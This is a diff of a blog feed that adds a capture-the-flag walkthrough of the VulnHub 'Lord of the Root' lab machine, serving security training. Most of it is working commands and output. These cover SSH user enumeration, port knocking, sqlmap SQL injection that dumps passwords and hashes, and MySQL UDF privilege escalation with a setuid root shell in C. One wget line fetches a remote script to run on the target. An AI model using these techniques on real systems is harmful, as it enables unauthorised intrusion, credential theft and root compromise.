@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-06-11T05:39:42-04:00</updated>
+  <updated>2017-06-15T14:41:03-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,1220 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Bow before the Lord of the Root]]></title>
+    <link href="http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root/"/>
+    <updated>2017-06-12T11:08:37-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root</id>
+    <content type="html"><![CDATA[<p>Back to looking through VulnHub&rsquo;s selection of virtual machines, I got hooked by the name of this one. The author intended for this machine to be similar in difficulty to those in the OSCP lab, so it&rsquo;s definitely good training if you&rsquo;re preparing to jump into the fray!</p>
+
+<!-- more -->
+
+
+<p>The port scan revealed only 1 open port:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I also ran a UDP scan, but got nothing. I proceeded to google the SSH version, and got a hit quite fast. It appears that this OpenSSH version is vulnerable to <a href="https://www.ubuntu.com/usn/usn-3061-1/">CVE-2016-6210</a>, which allows users to be enumerated.</p>
+
+<p>Luckily for us, there is an <a href="https://www.exploit-db.com/exploits/40136/">exploit</a> available.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python 40136.py -h
+</span><span class='line'>usage: 40136.py [-h] [-u USER | -U USERLIST] [-e] [-s] [--bytes BYTES]
+</span><span class='line'>                [--samples SAMPLES] [--factor FACTOR] [--trials TRIALS]
+</span><span class='line'>                host
+</span><span class='line'>
+</span><span class='line'>positional arguments:
+</span><span class='line'>  host                  Give SSH server address like ip:port or just by ip
+</span><span class='line'>
+</span><span class='line'>optional arguments:
+</span><span class='line'>  -h, --help            show this help message and exit
+</span><span class='line'>  -u USER, --user USER  Give a single user name
+</span><span class='line'>  -U USERLIST, --userlist USERLIST
+</span><span class='line'>                        Give a file containing a list of users
+</span><span class='line'>  -e, --enumerated      Only show enumerated users
+</span><span class='line'>  -s, --silent          Like -e, but just the user names will be written to
+</span><span class='line'>                        stdout (no banner, no anything)
+</span><span class='line'>  --bytes BYTES         Send so many BYTES to the SSH daemon as a password
+</span><span class='line'>  --samples SAMPLES     Collect so many SAMPLES to calculate a timing baseline
+</span><span class='line'>                        for authenticating non-existing users
+</span><span class='line'>  --factor FACTOR       Used to compute the upper timing boundary for user
+</span><span class='line'>                        enumeration
+</span><span class='line'>  --trials TRIALS       try to authenticate user X for TRIALS times and
+</span><span class='line'>                        compare the mean of auth timings against the timing
+</span><span class='line'>                        boundary</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So you have to give the script a username or a list of users to enumerate. Well, we already know one user! If you glanced at the LordOfTheRoot VM after it booted, you probably noticed good old smeagol:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/smeagol.png" title="smeagol" alt="smeagol"></p>
+
+<p>Ran the script with the smeagol username:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python 40136.py -u smeagol 192.168.217.136
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>User name enumeration against SSH daemons affected by CVE-2016-6210
+</span><span class='line'>Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>[*] Testing SSHD at: 192.168.217.136:22, Banner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3
+</span><span class='line'>[*] Getting baseline timing for authenticating non-existing users............
+</span><span class='line'>[*] Baseline mean for host 192.168.217.136 is 0.0507569 seconds.
+</span><span class='line'>[*] Baseline variation for host 192.168.217.136 is 0.0110011491622 seconds.
+</span><span class='line'>[*] Defining timing of x &lt; 0.0837603474867 as non-existing user.
+</span><span class='line'>[*] Testing your users...
+</span><span class='line'>[+] smeagol - timing: 0.425467</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We know there is a smeagol user on the box, but couldn&rsquo;t find any other exploit that might help in this situation. So I just tried SSH&#8217;ing into the box to see what happens:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssh smeagol@192.168.217.136
+</span><span class='line'>The authenticity of host '192.168.217.136 (192.168.217.136)' can't be established.
+</span><span class='line'>ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
+</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
+</span><span class='line'>Warning: Permanently added '192.168.217.136' (ECDSA) to the list of known hosts.
+</span><span class='line'>
+</span><span class='line'>                                                  .____    _____________________________
+</span><span class='line'>                                                  |    |   \_____  \__    ___/\______   \
+</span><span class='line'>                                                  |    |    /   |   \|    |    |       _/
+</span><span class='line'>                                                  |    |___/    |    \    |    |    |   \
+</span><span class='line'>                                                  |_______ \_______  /____|    |____|_  /
+</span><span class='line'>                                                          \/       \/                 \/
+</span><span class='line'> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+</span><span class='line'>|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
+</span><span class='line'>|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
+</span><span class='line'>|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
+</span><span class='line'>|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
+</span><span class='line'>        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+</span><span class='line'>Easy as 1,2,3
+</span><span class='line'>smeagol@192.168.217.136's password: </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Woot, a banner with a hint! The knock part might reference port knocking, as I&rsquo;ve seen that in some previous challenges. And the ports seem to be mentioned already! I used Nmap to knock on ports 1,2 and 3:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -r -p1,2,3 192.168.217.136
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-12 12:31 EDT
+</span><span class='line'>Nmap scan report for 192.168.217.136
+</span><span class='line'>Host is up (0.00065s latency).
+</span><span class='line'>PORT  STATE    SERVICE
+</span><span class='line'>1/tcp filtered tcpmux
+</span><span class='line'>2/tcp filtered compressnet
+</span><span class='line'>3/tcp filtered compressnet</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>-r</code> option was necessary to scan the ports in consecutive order. After knocking, I ran the full Nmap scan again, and a web server now awaited me:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I checked it out in the browser, and found this image:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/willdo.jpeg" title="mordor" alt="take the ring to mordor"></p>
+
+<p>Ran exiftool and strings on the picture, didn&rsquo;t find anything. Next I went to the <em>/images</em> directory where the image was served from, and found 2 more. Downloaded them and put them through exiftool and strings, still no results. In the meantime, I had also fired up a directory bruteforce on the server, but that didn&rsquo;t get me anywhere either. So the next thing I tried was to see if there is a directory called smeagol on the web server. There wasn&rsquo;t, but I was presented this picture, one of the 3 images found:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/hipster.jpg" title="hipster" alt="hipster"></p>
+
+<p>Further testing confirmed that this image acted as a 404 page. But when I looked at the source, I found a suspicious string in a comment:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I put the string into a <a href="https://encoder.mattiasgeniar.be/index.php">multipurpose online decoder</a> and got a base64 string out of it: <code>Lzk3ODM0NTIxMC9pbmRleC5waHA=</code>. Decoding it revealed a directory on the web server: <code>/978345210/index.php</code>. Going there, I found a login page!</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/mordor.png" title="mordor" alt="mordor login"></p>
+
+<p>Time for sqlmap! I had to play with it and tweak quite a bit, the default levels didn&rsquo;t report any injection vulnerability, and the scan took so long, I had to break the enumeration into manageable pieces:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" --current-db</span></code></pre></td></tr></table></div></figure>
+
+
+<p>First, I queried for the current DB in use. I also turned on all the optimizaton switches, raised testing levels, and started with the username parameter. And luckily, it was vulnerable:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>current database:    'Webapp'</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, I dumped the discovered database:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" -D Webapp --dump
+</span><span class='line'>[...]
+</span><span class='line'>Database: Webapp
+</span><span class='line'>Table: Users
+</span><span class='line'>[5 entries]
+</span><span class='line'>+----+----------+------------------+
+</span><span class='line'>| id | username | password         |
+</span><span class='line'>+----+----------+------------------+
+</span><span class='line'>| 1  | frodo    | iwilltakethering |
+</span><span class='line'>| 2  | smeagol  | MyPreciousR00t   |
+</span><span class='line'>| 3  | aragorn  | AndMySword       |
+</span><span class='line'>| 4  | legolas  | AndMyBow         |
+</span><span class='line'>| 5  | gimli    | AndMyAxe         |
+</span><span class='line'>+----+----------+------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now that I had usernames and passwords, it was time to test them on SSH! I started with smeagol, because it looked slightly different than the others :&ndash;) And I got in:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:~$ uname -a
+</span><span class='line'>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So, especially for older machines, one of the first things I do is check the kernel version. Googling it actually yielded a <a href="https://www.exploit-db.com/exploits/39166/">privilege escalation exploit</a> right away. I decided to save this approach for last, because the exploit wasn&rsquo;t known at the time of the VM release. Instead, I proceeded to some more conventional enumeration.</p>
+
+<p>I downloaded my <a href="https://github.com/chousensha/linux_privcheck">linux_privcheck</a> tool with <code>wget <a href="https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py">https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py</a></code> and ran it on the machine while I ate a lasagna. Then I combed through the output (note to self: I have to revisit my script and make improvements to it, will get to it). The interesting tidbits that I observed were:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root      1174     1  0 08:15 ?        00:00:08 /usr/sbin/mysqld</span></code></pre></td></tr></table></div></figure>
+
+
+<p>MySQL running as root! Definitely on to something there, as we could get root credentials from SQLi. The other thing I found were some setuid binaries in a suspicious folder:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/SECRET/door2/file
+</span><span class='line'>/SECRET/door1/file
+</span><span class='line'>/SECRET/door3/file</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The machine description on VulnHub stated that there are 2 methods for gaining privilege escalation..and here we are with 2 possible venues of attack! Let&rsquo;s take them in order!</p>
+
+<h2>Privilege escalation method #1 &ndash; via MySQL</h2>
+
+<p>With MySQL running as root, we can use <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">a UDF and a setuid binary to gain a root shell</a>. At the core of this exploit is the fact that a User Defined Function can be evaluated as SQL code to run commands in the context of the MySQL process, which is root in this case. As I was reading through the article, it became clear that root credentials would be needed for the database server. So I went back to sqlmap, and this time added the switches <code>&mdash;users</code> and <code>&mdash;passwords</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>database management system users [5]:
+</span><span class='line'>[*] 'debian-sys-maint'@'localhost'
+</span><span class='line'>[*] 'root'@'127.0.0.1'
+</span><span class='line'>[*] 'root'@'::1'
+</span><span class='line'>[*] 'root'@'localhost'
+</span><span class='line'>[*] 'root'@'lordoftheroot'
+</span><span class='line'>
+</span><span class='line'>database management system users password hashes:
+</span><span class='line'>[*] debian-sys-maint [1]:
+</span><span class='line'>    password hash: *A55A9B9049F69BC2768C9284615361DFBD580B34
+</span><span class='line'>[*] root [1]:
+</span><span class='line'>    password hash: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I used an online cracker for the root hash, and the cracked password was <em>darkshadow</em>. Then I connected to the MySQL database:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:~$ mysql -u root -p 
+</span><span class='line'>Enter password: 
+</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
+</span><span class='line'>Your MySQL connection id is 1829
+</span><span class='line'>Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
+</span><span class='line'>
+</span><span class='line'>Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
+</span><span class='line'>
+</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
+</span><span class='line'>affiliates. Other names may be trademarks of their respective
+</span><span class='line'>owners.
+</span><span class='line'>
+</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+</span><span class='line'>
+</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, I followed the steps of the <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">infamoussyn article</a>, which are really well explained. UDF files need to be <a href="https://dev.mysql.com/doc/refman/5.7/en/udf-compiling.html">locally compiled and installed on the server host</a>, and a special directory is required for that..</p>
+
+<ul>
+<li>Find the location where MySQL looks for shared object files, identified by the <code>plugin_dir</code> variable:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; show variables like "plugin_dir";
+</span><span class='line'>+---------------+------------------------+
+</span><span class='line'>| Variable_name | Value                  |
+</span><span class='line'>+---------------+------------------------+
+</span><span class='line'>| plugin_dir    | /usr/lib/mysql/plugin/ |
+</span><span class='line'>+---------------+------------------------+
+</span><span class='line'>1 row in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The required directory is found at <code>/usr/lib/mysql/plugin/</code>. This is where we&rsquo;ll put our UDF object files.</p>
+
+<ul>
+<li>Now it&rsquo;s time to compile the object file. The exploit that allows privilege escalation is called<a href="https://www.exploit-db.com/exploits/1518/">raptor_udf2.c</a>. I downloaded it to the compromised machine, and followed the instructions in the source code to compile it:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -g -c raptor_udf2.c</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If you are lost in the myriad of GCC options from its manpage, there is a cool page offering <a href="https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html">options summary</a> in a way that lets you jump to whatever interests you. Here, I compiled the C file without linking, and with debugging information. This produced an object file called <code>raptor_udf2.o</code>.</p>
+
+<ul>
+<li>Next, you create a shared library and link it:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If you copy from the source code, you have to change the 1 in <em>-W1</em> to a lowercase l, otherwise you get an error. Here&rsquo;s a <a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">good resource</a> to help you untangle the above command. Now you should also have in your directory a shared object called <code>raptor_udf2.so</code>.</p>
+
+<ul>
+<li>Now you create a table inside MySQL and insert the shared object contents. Switch to the mysql DB:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; use mysql;
+</span><span class='line'>Reading table information for completion of table and column names
+</span><span class='line'>You can turn off this feature to get a quicker startup with -A
+</span><span class='line'>
+</span><span class='line'>Database changed</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Create table:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; create table foo(line blob);
+</span><span class='line'>Query OK, 0 rows affected (0.03 sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Load your .so file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
+</span><span class='line'>Query OK, 1 row affected (0.01 sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>Copy the .so file to the plugin directory:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+</span><span class='line'>Query OK, 1 row affected (0.05 sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>Now you can create the UDF:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';
+</span><span class='line'>Query OK, 0 rows affected (0.00 sec)
+</span><span class='line'>
+</span><span class='line'>mysql&gt; select * from mysql.func;
+</span><span class='line'>+-----------+-----+----------------+----------+
+</span><span class='line'>| name      | ret | dl             | type     |
+</span><span class='line'>+-----------+-----+----------------+----------+
+</span><span class='line'>| do_system |   2 | raptor_udf2.so | function |
+</span><span class='line'>+-----------+-----+----------------+----------+
+</span><span class='line'>1 row in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>Confirm that it works:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select do_system('id &gt; /tmp/out; chown smeagol.smeagol /tmp/out');
+</span><span class='line'>+------------------------------------------------------------+
+</span><span class='line'>| do_system('id &gt; /tmp/out; chown smeagol.smeagol /tmp/out') |
+</span><span class='line'>+------------------------------------------------------------+
+</span><span class='line'>|                                                          0 |
+</span><span class='line'>+------------------------------------------------------------+
+</span><span class='line'>1 row in set (0.01 sec)
+</span><span class='line'>
+</span><span class='line'>mysql&gt; \! cat /tmp/out
+</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Note that you can use <em>\!</em> to run commands from within the MySQL shell.</p>
+
+<ul>
+<li>Finally, we want to gain a real root shell. A setuid shell is ideal for this. I placed the following C code inside a file called shell.c:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I used MySQL to compile it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select do_system("gcc -o /tmp/ring /home/smeagol/shell.c");
+</span><span class='line'>+-----------------------------------------------------+
+</span><span class='line'>| do_system("gcc -o /tmp/ring /home/smeagol/shell.c") |
+</span><span class='line'>+-----------------------------------------------------+
+</span><span class='line'>|                                                   0 |
+</span><span class='line'>+-----------------------------------------------------+
+</span><span class='line'>1 row in set (0.15 sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now set the SUID bit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select do_system("chmod u+s /tmp/ring");
+</span><span class='line'>+----------------------------------+
+</span><span class='line'>| do_system("chmod u+s /tmp/ring") |
+</span><span class='line'>+----------------------------------+
+</span><span class='line'>|                                0 |
+</span><span class='line'>+----------------------------------+
+</span><span class='line'>1 row in set (0.01 sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I looked inside /tmp for confirmation:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:~$ ls -l /tmp/
+</span><span class='line'>total 12
+</span><span class='line'>-rw-rw---- 1 smeagol smeagol   39 Jun 14 04:06 out
+</span><span class='line'>-rwsrwx--x 1 root    root    7410 Jun 14 04:16 ring</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Lastly, I dropped to a shell with <code>\! sh</code>, and ran the newly created binary:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ /tmp/ring
+</span><span class='line'>root@LordOfTheRoot:~# cat /root/Flag.txt 
